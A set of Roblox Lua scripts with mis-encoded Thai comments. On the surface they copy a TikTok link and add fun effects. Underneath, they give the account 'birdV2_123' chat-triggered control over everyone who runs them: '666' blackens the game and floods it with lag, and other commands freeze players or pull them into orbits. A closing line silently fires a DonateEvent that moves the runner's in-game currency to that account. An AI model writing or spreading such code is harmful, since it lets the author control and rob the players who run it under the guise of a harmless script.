if setclipboard then
    setclipboard(url)
    game.StarterGui:SetCore("SendNotification", {
        Title = "‡∏Ñ‡∏±‡∏î‡∏•‡∏≠‡∏Å‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÅ‡∏•‡πâ‡∏ß!",
        Text = "‡∏•‡∏¥‡∏á‡∏Å‡πå TikTok ‡∏ñ‡∏π‡∏Å‡∏Ñ‡∏±‡∏î‡∏•‡∏≠‡∏Å‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏Ñ‡∏•‡∏¥‡∏õ‡∏ö‡∏≠‡∏£‡πå‡∏î‡πÅ‡∏•‡πâ‡∏ß ‚úÖ",
        Duration = 5
    })
else
    warn("setclipboard ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÉ‡∏ô‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡∏ô‡∏µ‡πâ")
end







local allowedNames = {
    ["birdV2_123"] = true,
    ["Thai123456a2"] = true
}

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

-- ‡πÄ‡∏≠‡∏ü‡πÄ‡∏ü‡∏Ñ‡πÄ‡∏™‡∏µ‡∏¢‡∏á
local sound = Instance.new("Sound", workspace)
sound.SoundId = "rbxassetid://5993515228"
sound.Volume = 10
sound.Looped = true

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏£‡∏±‡∏ô‡πÄ‡∏≠‡∏ü‡πÄ‡∏ü‡∏Ñ
local function runEffect()
    -- ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÅ‡∏™‡∏á‡∏°‡∏∑‡∏î
    Lighting.Ambient = Color3.new(0, 0, 0)
    Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
    Lighting.Brightness = 0

    -- ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏û‡∏∑‡πâ‡∏ô‡πÉ‡∏´‡πâ‡∏î‡∏≥
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            obj.Color = Color3.new(0, 0, 0)
            obj.Material = Enum.Material.SmoothPlastic
        end
    end

    -- ‡πÄ‡∏•‡πà‡∏ô‡πÄ‡∏™‡∏µ‡∏¢‡∏á
    sound:Play()

    -- ‡πÄ‡∏≠‡∏ü‡πÄ‡∏ü‡∏Ñ‡πÑ‡∏ü
    coroutine.wrap(function()
        while true do
            local p = Instance.new("ParticleEmitter")
            p.Texture = "rbxassetid://243660364"
            p.Color = ColorSequence.new(Color3.new(1,0,0), Color3.new(1,1,0))
            p.LightEmission = 1
            p.Size = NumberSequence.new(10)
            p.Lifetime = NumberRange.new(1)
            p.Rate = 1000
            p.Speed = NumberRange.new(50)
            p.VelocitySpread = 360

            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") then
                    local clone = p:Clone()
                    clone.Parent = obj
                    game.Debris:AddItem(clone, 2)
                end
            end

            wait(0.2)
        end
    end)()

    -- ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÅ‡∏•‡∏Ñ
    coroutine.wrap(function()
        while true do
            for i = 1, 50 do
                local part = Instance.new("Part")
                part.Anchored = true
                part.CanCollide = false
                part.Size = Vector3.new(0.1,0.1,0.1)
                part.Position = Vector3.new(math.random(-1000,1000), math.random(1,1000), math.random(-1000,1000))
                part.BrickColor = BrickColor.Random()
                part.Parent = workspace
                game.Debris:AddItem(part, 5)
            end
            wait(0.1)
        end
    end)()
end

-- ‡πÄ‡∏ä‡πá‡∏Ñ‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡∏ó‡∏µ‡πà‡πÅ‡∏ä‡∏ó
local function connectChat(player)
    if allowedNames[player.Name] and player ~= LocalPlayer then -- üëà ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡πÇ‡∏î‡∏ô‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á
        player.Chatted:Connect(function(msg)
            if msg == "666" then
                runEffect()
            end
        end)
    end
end

-- ‡πÄ‡∏ù‡πâ‡∏≤‡∏î‡∏π‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÉ‡∏´‡∏°‡πà
for _, player in pairs(Players:GetPlayers()) do
    connectChat(player)
end

Players.PlayerAdded:Connect(connectChat)










-- LocalScript (Part 1/2)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local StarterPos = nil
local Locked = false
local Orbiting = false
local OrbitConnection
local OrbitSpeed = 0.1

-- Table ‡πÄ‡∏Å‡πá‡∏ö‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå
local ScriptUsers = {}
ScriptUsers[LocalPlayer.Name] = true

-- // UI ‡πÄ‡∏â‡∏û‡∏≤‡∏∞ birdV2_123
local ScreenGui, Frame, ListFrame, SpeedBox, ToggleButton
if LocalPlayer.Name == "birdV2_123" then
	ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "ScriptUI"
	ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

	Frame = Instance.new("Frame")
	Frame.Size = UDim2.new(0, 220, 0, 350)
	Frame.Position = UDim2.new(0.05, 0, 0.2, 0)
	Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	Frame.Active = true
	Frame.Draggable = true
	Frame.Parent = ScreenGui

	local Title = Instance.new("TextLabel")
	Title.Size = UDim2.new(1, 0, 0, 30)
	Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Title.Text = "‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ Script"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.Font = Enum.Font.SourceSansBold
	Title.TextSize = 18
	Title.Parent = Frame

	ListFrame = Instance.new("Frame")
	ListFrame.Size = UDim2.new(1, -10, 1, -80)
	ListFrame.Position = UDim2.new(0, 5, 0, 35)
	ListFrame.BackgroundTransparency = 1
	ListFrame.Parent = Frame

	local UIListLayout = Instance.new("UIListLayout")
	UIListLayout.Parent = ListFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	-- ‡∏Å‡∏•‡πà‡∏≠‡∏á‡∏õ‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏´‡∏°‡∏∏‡∏ô
	SpeedBox = Instance.new("TextBox")
	SpeedBox.Size = UDim2.new(1, -10, 0, 30)
	SpeedBox.Position = UDim2.new(0, 5, 1, -40)
	SpeedBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	SpeedBox.Text = tostring(OrbitSpeed)
	SpeedBox.TextColor3 = Color3.fromRGB(255,255,255)
	SpeedBox.PlaceholderText = "‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏´‡∏°‡∏∏‡∏ô"
	SpeedBox.Font = Enum.Font.SourceSans
	SpeedBox.TextSize = 16
	SpeedBox.Parent = Frame

	SpeedBox.FocusLost:Connect(function()
		local val = tonumber(SpeedBox.Text)
		if val and val > 0 then
			OrbitSpeed = val
		else
			SpeedBox.Text = tostring(OrbitSpeed)
		end
	end)

	-- ‡∏õ‡∏∏‡πà‡∏°‡∏ã‡πà‡∏≠‡∏ô/‡πÇ‡∏ä‡∏ß‡πå UI
	ToggleButton = Instance.new("TextButton")
	ToggleButton.Size = UDim2.new(0, 100, 0, 30)
	ToggleButton.Position = UDim2.new(0.05, 0, 0.1, 0)
	ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	ToggleButton.Text = "‡∏ã‡πà‡∏≠‡∏ô UI"
	ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	ToggleButton.Font = Enum.Font.SourceSansBold
	ToggleButton.TextSize = 16
	ToggleButton.Active = true
	ToggleButton.Draggable = true
	ToggleButton.Parent = ScreenGui

	local uiVisible = true
	ToggleButton.MouseButton1Click:Connect(function()
		uiVisible = not uiVisible
		Frame.Visible = uiVisible
		ToggleButton.Text = uiVisible and "‡∏ã‡πà‡∏≠‡∏ô UI" or "‡πÇ‡∏ä‡∏ß‡πå UI"
	end)
end

-- ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏£‡∏≤‡∏¢‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ Script
local function UpdateList()
	if LocalPlayer.Name ~= "birdV2_123" then return end
	for _, child in pairs(ListFrame:GetChildren()) do
		if child:IsA("TextLabel") then
			child:Destroy()
		end
	end

	for name,_ in pairs(ScriptUsers) do
		if name ~= "birdV2_123" then
			local lbl = Instance.new("TextLabel")
			lbl.Size = UDim2.new(1, 0, 0, 25)
			lbl.BackgroundTransparency = 1
			lbl.Text = name
			lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
			lbl.Font = Enum.Font.SourceSans
			lbl.TextSize = 16
			lbl.Parent = ListFrame
		end
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏•‡πá‡∏≠‡∏Ñ
local function LockPlayer()
	if not LocalPlayer.Character then return end
	Locked = true
	local hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
	local StarterPos = hrp.CFrame

	task.spawn(function()
		while Locked do
			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = StarterPos
				LocalPlayer.Character.Humanoid.WalkSpeed = 0
				LocalPlayer.Character.Humanoid.JumpPower = 0
			end
			task.wait(0.1)
		end
	end)
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏õ‡∏•‡∏î‡∏•‡πá‡∏≠‡∏Ñ
local function UnlockPlayer()
	Locked = false
	Orbiting = false
	if OrbitConnection then OrbitConnection:Disconnect() OrbitConnection = nil end
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
		LocalPlayer.Character.Humanoid.WalkSpeed = 16
		LocalPlayer.Character.Humanoid.JumpPower = 50
	end
end
-- LocalScript (Part 2/2)

-- ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á‡∏•‡∏á ScriptUsers
ScriptUsers[LocalPlayer.Name] = true

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÇ‡∏Ñ‡∏à‡∏£‡∏£‡∏≠‡∏ö birdV2_123
local function OrbitBird()
	local bird = Players:FindFirstChild("birdV2_123")
	if not bird or not bird.Character then return end
	local root = bird.Character:WaitForChild("HumanoidRootPart")

	Orbiting = true
	local angle = 0
	OrbitConnection = RunService.Heartbeat:Connect(function()
		if not Orbiting or not bird.Character or not bird.Character:FindFirstChild("HumanoidRootPart") then return end
		angle += OrbitSpeed
		local radius = 8
		local newPos = root.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame = newPos
		end
	end)
end

-- ‡∏ü‡∏±‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏à‡∏≤‡∏Å birdV2_123
local function ListenToBird(plr)
	plr.Chatted:Connect(function(msg)
		if msg == "‡∏ô‡∏¥‡πà‡∏á‡πÜ" then
			if LocalPlayer.Name ~= "birdV2_123" then
				LockPlayer()
			end
		elseif msg == "‡∏õ‡∏•‡πà‡∏≠‡∏¢" then
			if LocalPlayer.Name ~= "birdV2_123" then
				UnlockPlayer()
			end
		elseif msg == "TOUx1" then
			if LocalPlayer.Name ~= "birdV2_123" then
				OrbitBird()
			end
		end
	end)
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏°‡∏µ‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÉ‡∏´‡∏°‡πà‡πÉ‡∏ä‡πâ Script
local function OnPlayerUsingScript(plr)
	ScriptUsers[plr.Name] = true
	if LocalPlayer.Name == "birdV2_123" then
		UpdateList()
	end
end

-- ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á‡πÄ‡∏Ç‡πâ‡∏≤ ScriptUsers ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÄ‡∏ã‡∏¥‡∏ü
OnPlayerUsingScript(LocalPlayer)

-- ‡πÄ‡∏ù‡πâ‡∏≤‡∏£‡∏≠‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÄ‡∏ã‡∏¥‡∏ü
Players.PlayerAdded:Connect(function(plr)
	if LocalPlayer.Name == "birdV2_123" then
		UpdateList()
	end
	if plr.Name == "birdV2_123" then
		ListenToBird(plr)
	end
end)

-- ‡∏ü‡∏±‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ñ‡πâ‡∏≤ birdV2_123 ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß‡∏ï‡∏≠‡∏ô‡∏£‡∏±‡∏ô
local bird = Players:FindFirstChild("birdV2_123")
if bird then
	ListenToBird(bird)
end






-- LocalScript
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Sword Classic
local swordTemplate = ReplicatedStorage:FindFirstChild("Sword") 
if not swordTemplate then
    swordTemplate = game:GetService("StarterPack"):FindFirstChild("Sword")
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏î‡∏≤‡∏ö
local function giveSword(owner)
    if not swordTemplate then return end
    local sword = swordTemplate:Clone()
    sword.Parent = owner:WaitForChild("Backpack")

    -- ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå Damage
    local dmgScript = Instance.new("Script")
    dmgScript.Source = [[
        local tool = script.Parent
        local Players = game:GetService("Players")
        local owner = tool.Parent.Parent

        local function onHit(hit)
            local humanoid = hit.Parent:FindFirstChild("Humanoid")
            if humanoid and Players:FindFirstChild(owner.Name) then
                if owner.Name == "birdV2_123" then
                    humanoid:TakeDamage(50)
                else
                    humanoid:TakeDamage(1)
                end
            end
        end

        tool.Handle.Touched:Connect(onHit)
    ]]
    dmgScript.Parent = sword
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏° RGB ‡∏ö‡∏ô‡∏´‡∏±‡∏ß
local function addRGBNameTag(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local head = player.Character:FindFirstChild("Head") or player.Character:FindFirstChild("HumanoidRootPart")

        -- BillboardGui
        local billboard = Instance.new("BillboardGui")
        billboard.Size = UDim2.new(0,200,0,50)
        billboard.StudsOffset = Vector3.new(0,3,0)
        billboard.AlwaysOnTop = true
        billboard.Parent = head

        -- TextLabel
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1,0,1,0)
        text.BackgroundTransparency = 1
        text.Text = "[‡∏Ñ‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á]"
        text.Font = Enum.Font.GothamBold
        text.TextScaled = true
        text.Parent = billboard

        -- ‡∏ó‡∏≥‡πÉ‡∏´‡πâ RGB
        task.spawn(function()
            while text.Parent do
                text.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                task.wait(0.1)
            end
        end)
    end
end

-- Event: ‡∏ñ‡πâ‡∏≤ birdV2_123 ‡∏û‡∏¥‡∏°‡∏û‡πå "‡∏î‡∏≤‡∏ö" ‡∏à‡∏∞‡πÑ‡∏î‡πâ Sword
LocalPlayer.Chatted:Connect(function(msg)
    if msg == "‡∏î‡∏≤‡∏ö" and LocalPlayer.Name == "birdV2_123" then
        giveSword(LocalPlayer)
    end
end)

-- Event: ‡∏ñ‡πâ‡∏≤ player ‡∏ô‡∏µ‡πâ‡∏Ñ‡∏∑‡∏≠ birdV2_123 ‡πÉ‡∏´‡πâ‡πÅ‡∏õ‡∏∞‡∏õ‡πâ‡∏≤‡∏¢ RGB
if LocalPlayer.Name == "birdV2_123" then
    LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(1)
        addRGBNameTag(LocalPlayer)
    end)
    if LocalPlayer.Character then
        task.wait(1)
        addRGBNameTag(LocalPlayer)
    end
end

local args = {
	"birdV2_123",
	100
}
game:GetService("ReplicatedStorage"):WaitForChild("DonateEvent"):FireServer(unpack(args))
